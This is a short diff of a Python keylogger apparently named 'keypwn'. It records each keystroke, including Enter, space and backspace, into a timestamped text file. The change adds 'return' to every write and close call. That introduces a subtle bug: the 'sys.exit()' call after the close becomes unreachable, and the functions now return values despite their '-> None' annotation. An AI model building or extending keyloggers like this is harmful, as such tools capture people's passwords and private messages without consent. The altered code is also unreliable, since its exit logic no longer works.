@@ -12,21 +12,21 @@ def write_to_log_file(key) -> None:
     keys = str(key)
 
     if keys == "'\\x03'":
-        log_file.close()
+        return log_file.close()
         sys.exit()
 
     if keys == 'Key.enter':
-        log_file.write('\n')
+        return log_file.write('\n')
     elif keys == 'Key.space':
-        log_file.write(' ')
+        return log_file.write(' ')
     elif keys == 'Key.backspace':
-        log_file.write('%BORRAR%')
+        return log_file.write('%BORRAR%')
     else:
-        log_file.write(keys.replace("'", ""))
+        return log_file.write(keys.replace("'", ""))
 
 def main() -> None:
     global log_file
-    
+
     try:
         log_file_name = f'keypwn_{get_current_date_time()}.txt'
         log_file = open(log_file_name, 'w')
